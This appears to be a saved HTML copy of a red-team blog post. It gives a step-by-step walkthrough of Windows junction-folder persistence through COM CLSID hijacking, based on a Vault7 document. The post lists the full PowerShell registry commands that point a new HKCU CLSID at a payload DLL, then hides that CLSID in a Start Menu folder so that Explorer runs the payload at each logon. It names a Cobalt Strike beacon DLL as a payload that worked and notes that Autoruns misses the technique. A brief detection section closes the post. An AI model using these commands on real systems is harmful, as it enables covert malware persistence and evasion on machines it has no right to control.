<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>General Primer</title>
</head><body>Note that this example requires a file on disk and modification/addition of the HKCU hive.<br/>
<br/>
https://vanmieghem.io/persisting-like-a-cia-agent/<br/>
<br/>
A while back a colleague of mine pointed me to <a href="https://wikileaks.org/ciav7p1/cms/page_13763373.html">this</a>&nbsp;Vault7 page. Last weekend I found some time to get this technique to work. &nbsp;Please read the Vault7 page first and if you’re interested, more research related to <a href="https://www.gdatasoftware.com/blog/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence">COM hijacking</a>&nbsp;and on <a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/">Abusing the COM Registry Structure</a>.<br/>
<br/>
Basically this method works by registering a COM CLSID and using that CLSID to point to an (in this case) executable. When Windows encounters this CLSID, it performs a lookup in the registry and executes the corresponding COM object, given the correct properties are set. So called “Junction Folders” are then used to trigger CLSID lookups in Windows.<br/>
<br/>
<b>Configuring peristence</b><br/>
PS C:\&gt; [guid]::newguid()<br/>
<br/>
Guid<br/>
----<br/>
781a4161-4490-408d-814a-93efe3b100c3<br/>
<br/>
The third command is most interesting because this is where you point the CLSID to your executable on disk, in this case C:\beacon.dll. For this method to work, there are some requirements to be met by this executable (more about that later).<br/>
<br/>
New-Item –Path "HKCU:\Software\Classes\CLSID\" -Name "{781a4161-4490-408d-814a-93efe3b100c3}"<br/>
<br/>
New-Item –Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}" &nbsp;-Name "InprocServer32"<br/>
<br/>
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32" -Name "(Default)" -Value "C:\beacon.dll" -PropertyType "String"<br/>
<br/>
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32" -Name "ThreadingModel" -Value "Apartment" -PropertyType "String"<br/>
<br/>
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\InprocServer32" -Name "LoadWithoutCOM" -Value "" -PropertyType "String"<br/>
<br/>
New-Item –Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}" &nbsp;-Name "ShellFolder"<br/>
<br/>
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder" -Name "HideOnDesktop" -Value "" -PropertyType "String"<br/>
<br/>
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{781a4161-4490-408d-814a-93efe3b100c3}\ShellFolder" -Name "Attributes" -Value 0xf090013d -Type DWord<br/>
<br/>
Then you create your junction folder, using this CLSID we just registered. Windows Explorer will help us by hiding the CLSID:<br/>
<br/>
New-Item -ItemType Directory -Force -Path "C:\Users\superusr\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Windows Accessories\Indexing.{781a4161-4490-408d-814a-93efe3b100c3}"<br/>
<br/>
<img src="image.png" /><br/>
<br/>
For persistence, this directory should be a directory that Explorer loads when started on boot. CIA recommends using Windows Accessories, but I’m sure there are other directories. The Startup directory could also be used but is obviously more suspicious. Procmon could be of help finding those directories that can be used to persist using Windows Explorer (or others).<br/>
<br/>
<br/>
<b>DLL structure </b><br/>
I’ve spent some time trying to create a C++ DLL that executes shellcode or a process, but all attempts resulted in explorer.exe crashing. Eventually, I tried a stageless x64 DLL generated by Cobalt Strike containing 64-bit shellcode on a x64 version of Windows 10, which did the job.<br/>
&nbsp; <br/>
Based on artifact kit’s source code, a VirtualAlloc + VirtualProtect + CreateThread execution with stageless 64-bit shellcode should work, but I still have to figure out the exact constrains set by explorer.exe. &nbsp;<br/>
<br/>
<br/>
<br/>
<b>Detection</b>&nbsp;<br/>
Yeah, that’s a bit more difficult. Autoruns does not detect this persistency method. <a href="https://twitter.com/fuseyjz">@fuseyjz</a>&nbsp;from Countercept <a href="https://countercept.com/blog/hunting-for-junction-folder-persistence/">created a script</a>&nbsp;that can be used to hunt for this technique by enumerating folders containing a CLISD in ...\Start Menu\ and mapping them against CLSIDs registered in the registry. However, it should be noted that this script only checks HKCU and that explorer.exe is not the only process that can be leveraged to perform a CLSID lookup…<br/>
&nbsp; <br/>
<br/>
</body></html>